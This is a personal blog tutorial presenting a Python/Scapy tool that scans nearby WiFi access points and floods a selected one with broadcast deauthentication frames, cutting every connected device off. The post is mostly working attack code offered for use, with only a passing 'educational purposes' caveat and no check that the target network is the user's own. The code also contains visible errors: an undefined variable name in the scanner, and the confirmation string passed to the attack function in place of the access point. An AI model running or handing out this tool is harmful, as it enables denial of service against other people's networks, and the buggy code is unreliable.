---
title: "Deauthentication attack against WiFi"
date: 2021-11-07T15:18:06+01:00
draft: false
---

A while ago I learned about deauthentication attacks on WiFi access points (AP). Simply put you should be able to perform a DoS attack on a WiFi without having to authenticate to it.
The attack is performed by sending a deauth management frame to the AP. I wanted to try it out and learn how and if it actually works. I found that it did and here is my implementation in Python. I had a great time developing this implementation and testing it out. It worked fine for me but it is possibly not risk free. Be cautious and use it only for educational purposes :) 

## Laying the groundwork
To run this from your laptop you will need a wireless network interface that support [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode). Luckily mine did and I can switch to it by running `iwconfig <wireless-interface> mode monitor`. Similarly I can go back to managed mode with the same command after performing the attack. This is a bit simplified but the following Python code will describe how to go back and fort between managed- and monitor mode. As you can see at the end there is also a function for setting the channel of the network interface, but we will get to that in a bit. The commands might depend on you OS, I ran with Ubuntu 20.04 but there is probably equivalent commands for you.


```python
# network_interface.py
from subprocess import run


def monitor_mode(interface: str):
    run(["systemctl", "stop", "NetworkManager"])
    run(["ifconfig", interface, "down"])
    run(["iwconfig", interface, "mode", "monitor"])
    run(["ifconfig", interface, "up"])


def managed_mode(interface: str):
    run(["ifconfig", interface, "down"])
    run(["iwconfig", interface, "mode", "managed"])
    run(["ifconfig", interface, "up"])
    run(["systemctl", "start", "NetworkManager"])


def hop_channel(interface: str, channel: int):
    run(["iwconfig", interface, "channel", str(channel)])
```


## Detect your target
Next we need to detect the details of your target. This is very easy because WiFi AP's emit beacons that shout out it's name and what MAC-address it has. It makes sense because how else would you computer be able to find AP's nearby? To do this in Python we will use Scapy to sniff for the beacons and collect the information necessary from them. Here we need to scan all channels that are relevant, because when we are in monitor mode we can only detect AP's on the current channel. 


```python
# wifi.py
from time import sleep
from typing import Sequence
from scapy.all import AsyncSniffer, Dot11, Dot11Deauth, RadioTap, sendp
from access_point import AccessPoint
from network_interface import hop_channel


def detect_networks(interface: str, channels: Sequence[int]):
    """
    Detect WiFi access points
    """
    print("Scanning for nearby WiFi networks...")
    access_points = {}
    
    for channel in channels:
        hop_channel(interface, channel)
        packets = _sniff_wifi_beacons(interface)
        for packet in packets:
            access_points[packet.addr2] = AccessPoint(mac=packet.addr2, ssid=packet.info.decode('utf-8'), channel=channel)
    access_points = list(acces_points.values())
    access_points.sort(key=lambda n : n.ssid)
    return access_points


def _sniff_wifi_beacons(interface):
    """
    Sniff for 802.11 beacon frames
    """
    sniffer = AsyncSniffer(iface=interface, filter="wlan type mgt subtype beacon", store=True)
    sniffer.start()
    sleep(2)
    sniffer.stop()
    return sniffer.results
```

Whenever we find an AP we will use the small model class AccessPoint and save it for later.

```python
# access_point.py
from dataclasses import dataclass


@dataclass
class AccessPoint():
    mac: str
    ssid: str
    channel: str
```

## Attack

We will extend the file `wifi.py` with the logic of the actual attack. Once we have the MAC-address of the target we will craft Dot11Deauth packet and spam the access point with it. Here we are targeting the broadcast MAC-address which will deny access for all devices until we reach the count of 100000 packets sent.

```python
def attack(interface: str, access_point: AccessPoint):
    hop_channel(interface, access_point.channel)
    target_device = "FF:FF:FF:FF:FF:FF"
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=target_device, addr2=access_point.mac, addr3=access_point.mac)/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=100000, iface=interface, verbose=1)
```

## Tie it all together
Lastly here is the main script that ties it all together. It will initially scan for the available AP's and then prompt you for which one you want to attack. 
The channels are magically hard coded but you can check out what make sense for where you live [here](https://en.wikipedia.org/wiki/List_of_WLAN_channels).


```python
from wifi import detect_networks, attack
from network_interface import monitor_mode, managed_mode


CHANNELS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 36, 40, 44, 48, 52, 56, 60, 64]
WIFI_INTERFACE = "wlp4s0"

monitor_mode(WIFI_INTERFACE)
acces_points = detect_networks(WIFI_INTERFACE, CHANNELS)

for i, ap in enumerate(acces_points):
    print(f"{i}: {ap}")

option = input("Select which network to deauthenticate and hit return: ")
acces_point = acces_points[int(option)]
answer = input(f"Are you sure you want to deauthenticate {acces_point.ssid}? Y/n ")
if not answer == "Y":
    exit(0)

attack(WIFI_INTERFACE, answer)
managed_mode(WIFI_INTERFACE)
```

Hope you enjoyed the read and if you want to check out the source code you find on [GitHub](https://github.com/krausen/wifi-deauthentication)
